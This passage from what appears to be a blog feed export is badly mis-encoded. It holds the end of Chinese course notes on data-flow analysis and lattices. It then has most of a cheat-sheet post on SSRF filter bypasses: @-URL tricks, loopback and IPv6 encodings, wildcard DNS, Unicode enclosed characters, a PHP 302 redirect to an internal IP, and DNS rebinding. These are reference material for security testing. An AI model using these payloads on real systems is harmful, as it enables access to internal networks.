src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183449579.png" class="" title="image-20220103183449579"><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183816522.png" class="" title="image-20220103183816522"><h3 id="2-2-Reaching-Definitions-Analysis"><a href="#2-2-Reaching-Definitions-Analysis" class="headerlink" title="2.2 Reaching Definitions Analysis"></a>2.2 Reaching Definitions Analysis</h3><h4 id="Reaching-Definitions-å®šä¹‰è§£æ"><a href="#Reaching-Definitions-å®šä¹‰è§£æ" class="headerlink" title="Reaching Definitions å®šä¹‰è§£æ"></a>Reaching Definitions å®šä¹‰è§£æ</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103114709803.png" class="" title="image-20220103114709803"><h4 id="â­ï¸Reaching-Definitions-å®ç°ç®—æ³•"><a href="#â­ï¸Reaching-Definitions-å®ç°ç®—æ³•" class="headerlink" title="â­ï¸Reaching Definitions å®ç°ç®—æ³•"></a>â­ï¸Reaching Definitions å®ç°ç®—æ³•</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115143201.png" class="" title="image-20220103115143201"><h4 id="Reaching-Definitions-å®ä¾‹æ¼”ç¤º"><a href="#Reaching-Definitions-å®ä¾‹æ¼”ç¤º" class="headerlink" title="Reaching Definitions å®ä¾‹æ¼”ç¤º"></a>Reaching Definitions å®ä¾‹æ¼”ç¤º</h4><p>æ¯ä¸€ä¸ªå˜é‡èµ‹å€¼è¡¨è¾¾å¼å­ç”¨éƒ½ä»£è¡¨ä¸€ä¸ªDefinitionï¼Œè¿™é‡Œç”¨Dnè¡¨ç¤ºï¼Œè“è‰²ä»£è¡¨å˜é‡xï¼Œçº¢è‰²ä»£è¡¨yï¼Œé»‘è‰²ä»£è¡¨mï¼Œç»¿è‰²ä»£è¡¨z</p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115459081.png" class="" title="image-20220103115459081"><h3 id="2-3-Live-Variables-Analysis-ï¼ˆç¬¬å››èŠ‚è¯¾ï¼‰"><a href="#2-3-Live-Variables-Analysis-ï¼ˆç¬¬å››èŠ‚è¯¾ï¼‰" class="headerlink" title="2.3 Live Variables Analysis ï¼ˆç¬¬å››èŠ‚è¯¾ï¼‰"></a>2.3 Live Variables Analysis ï¼ˆç¬¬å››èŠ‚è¯¾ï¼‰</h3><h4 id="Live-Variables-å®šä¹‰è§£æ"><a href="#Live-Variables-å®šä¹‰è§£æ" class="headerlink" title="Live Variables å®šä¹‰è§£æ"></a>Live Variables å®šä¹‰è§£æ</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103123845303.png" class="" title="image-20220103123845303"><h4 id="â­ï¸Live-Variables-å®ç°ç®—æ³•"><a href="#â­ï¸Live-Variables-å®ç°ç®—æ³•" class="headerlink" title="â­ï¸Live Variables å®ç°ç®—æ³•"></a>â­ï¸Live Variables å®ç°ç®—æ³•</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103163513747.png" class="" title="image-20220103163513747"><h4 id="Live-Variables-å®ä¾‹æ¼”ç¤º"><a href="#Live-Variables-å®ä¾‹æ¼”ç¤º" class="headerlink" title="Live Variables å®ä¾‹æ¼”ç¤º"></a>Live Variables å®ä¾‹æ¼”ç¤º</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103174745109.png" class="" title="image-20220103174745109"><h3 id="2-4-Available-Expressions-Analysis"><a href="#2-4-Available-Expressions-Analysis" class="headerlink" title="2.4 Available Expressions Analysis"></a>2.4 Available Expressions Analysis</h3><h4 id="Available-Expressions-å®šä¹‰è§£æ"><a href="#Available-Expressions-å®šä¹‰è§£æ" class="headerlink" title="Available Expressions å®šä¹‰è§£æ"></a>Available Expressions å®šä¹‰è§£æ</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180809651.png" class="" title="image-20220103180809651"><h4 id="â­ï¸Available-Expressions-å®ç°ç®—æ³•"><a href="#â­ï¸Available-Expressions-å®ç°ç®—æ³•" class="headerlink" title="â­ï¸Available Expressions å®ç°ç®—æ³•"></a>â­ï¸Available Expressions å®ç°ç®—æ³•</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180018797.png" class="" title="image-20220103180018797"><h4 id="Available-Expressions-ç¤ºä¾‹æ¼”ç¤º"><a href="#Available-Expressions-ç¤ºä¾‹æ¼”ç¤º" class="headerlink" title="Available Expressions ç¤ºä¾‹æ¼”ç¤º"></a>Available Expressions ç¤ºä¾‹æ¼”ç¤º</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180716543.png" class="" title="image-20220103180716543"><h3 id="â­ï¸2-5-ä¸‰ç§æ•°æ®æµåˆ†æåº”ç”¨å¯¹æ¯”"><a href="#â­ï¸2-5-ä¸‰ç§æ•°æ®æµåˆ†æåº”ç”¨å¯¹æ¯”" class="headerlink" title="â­ï¸2.5 ä¸‰ç§æ•°æ®æµåˆ†æåº”ç”¨å¯¹æ¯”"></a>â­ï¸2.5 ä¸‰ç§æ•°æ®æµåˆ†æåº”ç”¨å¯¹æ¯”</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103181138043.png" class="" title="image-20220103181138043"><h2 id="3-Data-Flow-Analysis-Foundations-ï¼ˆç¬¬äº”ã€å…­èŠ‚è¯¾ï¼‰"><a href="#3-Data-Flow-Analysis-Foundations-ï¼ˆç¬¬äº”ã€å…­èŠ‚è¯¾ï¼‰" class="headerlink" title="3. Data Flow Analysis - Foundations ï¼ˆç¬¬äº”ã€å…­èŠ‚è¯¾ï¼‰"></a>3. Data Flow Analysis - Foundations ï¼ˆç¬¬äº”ã€å…­èŠ‚è¯¾ï¼‰</h2><h3 id="â­ï¸3-1-Iterative-Algorithm-Another-View"><a href="#â­ï¸3-1-Iterative-Algorithm-Another-View" class="headerlink" title="â­ï¸3.1 Iterative Algorithm, Another View"></a>â­ï¸3.1 Iterative Algorithm, Another View</h3><p>å‰é¢3ä¸­æ•°æ®æµåˆ†æç®—æ³•æ»¡è¶³<strong>ä¸åŠ¨ç‚¹å®šå¾‹</strong></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109104249059.png" class="" title="image-20220109104249059"><h3 id="3-2-Partial-Order"><a href="#3-2-Partial-Order" class="headerlink" title="3.2 Partial Order"></a>3.2 Partial Order</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135207135.png" class="" title="image-20220109135207135"><h3 id="3-3-Upper-and-Lower-Bounds"><a href="#3-3-Upper-and-Lower-Bounds" class="headerlink" title="3.3 Upper and Lower Bounds"></a>3.3 Upper and Lower Bounds</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135035140.png" class="" title="image-20220109135035140"><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109140408193.png" class="" title="image-20220109140408193"><h3 id="â­ï¸3-4-Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#â­ï¸3-4-Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="â­ï¸3.4 Lattice, Semilattice, Complete and Product Lattice"></a>â­ï¸3.4 Lattice, Semilattice, Complete and Product Lattice</h3><ul><li><strong>Lattice(æ ¼)ï¼šposetä¸­çš„ä»»æ„2ä¸ªå…ƒç´ ï¼Œéƒ½å­˜åœ¨æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œ</strong></li><li><strong>Semilattice(åŠæ ¼)ï¼šposetä¸­çš„ä»»æ„2ä¸ªå…ƒç´ ï¼Œåªæœ‰ä¸Šç•Œæˆ–åªæœ‰ä¸‹ç•Œ</strong></li><li><strong>Complete Lattice(å®Œå…¨æ ¼)ï¼šä¸€ä¸ªLatticeçš„ä»»æ„å­é›†éƒ½å­˜åœ¨æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œåˆ™ç§°ä¸ºComplete Lattice</strong><ul><li>å…¶å®finiteçš„latticeä¸€å®šæ˜¯Complete Latticeï¼ˆåè¿‡æ¥ä¸ä¸€å®šï¼‰</li></ul></li><li><strong>Product Latticeï¼šå¯ç†è§£ä¸ºå¤šä¸ªLatticeçš„ç¬›å¡å°”ç§¯</strong><ul><li>Product Latticeä¹Ÿæ˜¯ä¸€ä¸ªLattice</li><li>æ„æˆProduct Latticeçš„æ¯ä¸€ä¸ªLatticeéƒ½æ˜¯Completeçš„ï¼Œé‚£ä¹ˆè¿™ä¸ªProduct Latticeä¹Ÿæ˜¯Complete</li></ul></li></ul><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135417528.png" class="" title="image-20220109135417528"><p>.<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109143223130.png" class="" title="image-20220109143223130"></p><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109142123333.png" class="" title="image-20220109142123333"><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a class="link"   href="https://space.bilibili.com/2919428/channel/seriesdetail?sid=1006553&ctype=0" >è¯¾ç¨‹è§†é¢‘<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://pascal-group.bitbucket.io/teaching.html" >è¯¾ä»¶<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRFç»•è¿‡å§¿åŠ¿æ±‡æ€»</title>
      <link href="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/"/>
      <url>/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç¬¦å·ç»•è¿‡"><a href="#1-ç¬¦å·ç»•è¿‡" class="headerlink" title="1. @ç¬¦å·ç»•è¿‡"></a>1. @ç¬¦å·ç»•è¿‡</h2><p><code>http://www.baidu.com@10.10.10.10</code>ä¸<code>http://10.10.10.10</code>è¯·æ±‚æ˜¯ç›¸åŒçš„</p><p>è¯¥è¯·æ±‚å¾—åˆ°çš„å†…å®¹éƒ½æ˜¯10.10.10.10çš„å†…å®¹ï¼Œæ­¤ç»•è¿‡åŒæ ·åœ¨URLè·³è½¬ç»•è¿‡ä¸­é€‚ç”¨ã€‚</p><h2 id="2-ç‚¹åˆ†éš”ç¬¦æ›¿æ¢"><a href="#2-ç‚¹åˆ†éš”ç¬¦æ›¿æ¢" class="headerlink" title="2. ç‚¹åˆ†éš”ç¬¦æ›¿æ¢"></a>2. ç‚¹åˆ†éš”ç¬¦æ›¿æ¢</h2><p>åœ¨æµè§ˆå™¨ä¸­å¯ä»¥ä½¿ç”¨ä¸åŒçš„åˆ†å‰²ç¬¦å·æ¥ä»£æ›¿åŸŸåä¸­çš„<code>.</code>åˆ†å‰²ï¼Œå¯ä»¥ä½¿ç”¨<code>ã€‚</code>ã€<code>ï½¡</code>ã€<code>ï¼</code>æ¥ä»£æ›¿ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://wwwã€‚qqã€‚com</span><br><span class="line">http://wwwï½¡qqï½¡com</span><br><span class="line">http://wwwï¼qqï¼com</span><br></pre></td></tr></table></figure><h2 id="3-æœ¬åœ°å›ç¯åœ°å€"><a href="#3-æœ¬åœ°å›ç¯åœ°å€" class="headerlink" title="3. æœ¬åœ°å›ç¯åœ°å€"></a>3. æœ¬åœ°å›ç¯åœ°å€</h2><p>127.0.0.1ï¼Œé€šå¸¸è¢«ç§°ä¸ºæœ¬åœ°å›ç¯åœ°å€(Loopback Address)ï¼ŒæŒ‡æœ¬æœºçš„è™šæ‹Ÿæ¥å£ï¼Œä¸€äº›è¡¨ç¤ºæ–¹æ³•å¦‚ä¸‹(ipv6çš„åœ°å€ä½¿ç”¨httpè®¿é—®éœ€è¦åŠ <code>[]</code>)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1 </span><br><span class="line">http:&#x2F;&#x2F;localhost </span><br><span class="line">http:&#x2F;&#x2F;127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http:&#x2F;&#x2F;127.1 </span><br><span class="line">http:&#x2F;&#x2F;127.0.1 </span><br><span class="line">http:&#x2F;&#x2F;0:80</span><br></pre></td></tr></table></figure><p>IPV6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:7f00:1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:127.0.0.1] </span><br><span class="line">http:&#x2F;&#x2F;ip6-localhost</span><br><span class="line">http:&#x2F;&#x2F;0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure><h2 id="4-DNSè§£æ"><a href="#4-DNSè§£æ" class="headerlink" title="4. DNSè§£æ"></a>4. DNSè§£æ</h2><p>é…ç½®åŸŸåçš„DNSè§£æåˆ°ç›®æ ‡åœ°å€(Aã€cnameç­‰)ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªé…ç½®è§£æåˆ°ä»»æ„çš„åœ°å€çš„åŸŸåï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure><p>xip.ioæ˜¯ä¸€ä¸ªå¼€æºæ³›åŸŸåæœåŠ¡ã€‚å®ƒä¼šæŠŠå¦‚ä¸‹çš„åŸŸåè§£æåˆ°ç‰¹å®šçš„åœ°å€ï¼Œå…¶å®å’Œdnsè§£æç»•è¿‡ä¸€ä¸ªé“ç†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure><h2 id="5-IPçš„è¿›åˆ¶è½¬æ¢"><a href="#5-IPçš„è¿›åˆ¶è½¬æ¢" class="headerlink" title="5. IPçš„è¿›åˆ¶è½¬æ¢"></a>5. IPçš„è¿›åˆ¶è½¬æ¢</h2><p>IPåœ°å€æ˜¯ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œé€šå¸¸è¢«åˆ†å‰²ä¸º4ä¸ª8ä½äºŒè¿›åˆ¶æ•°ã€‚é€šå¸¸ç”¨â€œç‚¹åˆ†åè¿›åˆ¶â€è¡¨ç¤ºæˆï¼ˆa.b.c.dï¼‰çš„å½¢å¼ï¼Œæ‰€ä»¥IPåœ°å€çš„æ¯ä¸€æ®µå¯ä»¥ç”¨å…¶ä»–è¿›åˆ¶æ¥è½¬æ¢ã€‚ <a class="link"   href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> å·¥å…·å¯å®ç°IPåœ°å€çš„è¿›åˆ¶è½¬æ¢ï¼ŒåŒ…æ‹¬äº†å…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€æ··åˆè¿›åˆ¶ã€‚åœ¨è¿™ä¸ªå·¥å…·çš„åŸºç¡€ä¸Šæ·»åŠ äº†IPV6çš„è½¬æ¢å’Œç‰ˆæœ¬è¾“å‡ºçš„ä¼˜åŒ–ã€‚</p><h2 id="6-å°é—­å¼å­—æ¯æ•°å­—-Enclosed-Alphanumerics-å­—ç¬¦"><a href="#6-å°é—­å¼å­—æ¯æ•°å­—-Enclosed-Alphanumerics-å­—ç¬¦" class="headerlink" title="6. å°é—­å¼å­—æ¯æ•°å­— (Enclosed Alphanumerics)å­—ç¬¦"></a>6. å°é—­å¼å­—æ¯æ•°å­— (Enclosed Alphanumerics)å­—ç¬¦</h2><p>ä¸€äº›ç½‘ç»œè®¿é—®å·¥å…·å¦‚Curlç­‰æ˜¯æ”¯æŒå›½é™…åŒ–åŸŸåï¼ˆInternationalized Domain Nameï¼ŒIDNï¼‰çš„ï¼Œå›½é™…åŒ–åŸŸååˆç§°ç‰¹æ®Šå­—ç¬¦åŸŸåï¼Œæ˜¯æŒ‡éƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨ç‰¹æ®Šçš„æ–‡å­—æˆ–å­—æ¯ç»„æˆçš„äº’è”ç½‘åŸŸåã€‚</p><p>åœ¨è¿™äº›å­—ç¬¦ä¸­ï¼Œéƒ¨åˆ†å­—ç¬¦ä¼šåœ¨è®¿é—®æ—¶åšä¸€ä¸ªç­‰ä»·è½¬æ¢ï¼Œä¾‹å¦‚ <code>â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ</code> å’Œ <code>example.com</code> ç­‰åŒã€‚åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ç”¨ <code>â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘©</code> ç­‰å­—ç¬¦ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h2 id="7-åˆ©ç”¨ç½‘å€ç¼©çŸ­"><a href="#7-åˆ©ç”¨ç½‘å€ç¼©çŸ­" class="headerlink" title="7. åˆ©ç”¨ç½‘å€ç¼©çŸ­"></a>7. åˆ©ç”¨ç½‘å€ç¼©çŸ­</h2><p>ç½‘ä¸Šæœ‰å¾ˆå¤šå°†ç½‘å€è½¬æ¢æœªçŸ­ç½‘å€çš„ç½‘ç«™ã€‚</p><ul><li><p><a class="link"   href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link"   href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p></li></ul><h2 id="8-åˆ©ç”¨30Xé‡å®šå‘"><a href="#8-åˆ©ç”¨30Xé‡å®šå‘" class="headerlink" title="8. åˆ©ç”¨30Xé‡å®šå‘"></a>8. åˆ©ç”¨30Xé‡å®šå‘</h2><p>å¯ä»¥ä½¿ç”¨é‡å®šå‘æ¥è®©æœåŠ¡å™¨è®¿é—®ç›®æ ‡åœ°å€ï¼Œå¯ç”¨äºé‡å®šå‘çš„HTTPçŠ¶æ€ç ï¼š300ã€301ã€302ã€303ã€305ã€307ã€308ã€‚</p><p>éœ€è¦ä¸€ä¸ªvpsï¼ŒæŠŠ302è½¬æ¢çš„ä»£ç éƒ¨ç½²åˆ°vpsä¸Šï¼Œç„¶åå»è®¿é—®ï¼Œå°±å¯è·³è½¬åˆ°å†…ç½‘ä¸­</p><p>æœåŠ¡ç«¯ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-DNSé‡ç»‘å®š-DNS-Rebinding"><a href="#9-DNSé‡ç»‘å®š-DNS-Rebinding" class="headerlink" title="9. DNSé‡ç»‘å®š(DNS Rebinding)"></a>9. DNSé‡ç»‘å®š(DNS Rebinding)</h2><p>é€šå¸¸æˆ‘ä»¬é€šè¿‡åŸŸåè®¿é—®åº”ç”¨çš„æµç¨‹æ˜¯ï¼šæµè§ˆå™¨å‘DNSæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼ŒDNSæœåŠ¡å™¨å°†è¯·æ±‚çš„åŸŸåè½¬æ¢ä¸ºipåœ°å€ï¼Œç„¶åå‘å¯¹åº”çš„IPåœ°å€è¯·æ±‚èµ„æºï¼Œæœ€åå›æ˜¾ç»™ç”¨æˆ·ã€‚</p><p>åœ¨è®¿é—®DNSåè¯·æ±‚æ–¹ä¼šç¼“å­˜åŸŸåå’ŒIPçš„å¯¹åº”å…³ç³»ï¼Œè€Œç¼“å­˜æ—¶é—´å°±æ˜¯ç”±DNSæœåŠ¡å™¨è®¾ç½®çš„TTLå€¼å†³å®šã€‚</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹é€šè¿‡æŸç§æ–¹å¼å¯¹åº”çš„IPåœ°å€ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ï¼Œå¯¹äºæµè§ˆå™¨æ¥è¯´å‰å2æ¬¡è®¿é—®æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œè¿™å°±å¯å¯¼è‡´ç»•è¿‡åŒæºç­–ç•¥å’ŒSSRFé™åˆ¶ã€‚ä¸‹é¢ä»‹ç»3ç§å¸¸è§çš„DNSä»ç»‘å®šæ–¹æ³•ã€‚</p><h3 id="9-1-TTL-0çš„Aè®°å½•"><a href="#9-1-TTL-0çš„Aè®°å½•" class="headerlink" title="9.1 TTL=0çš„Aè®°å½•"></a>9.1 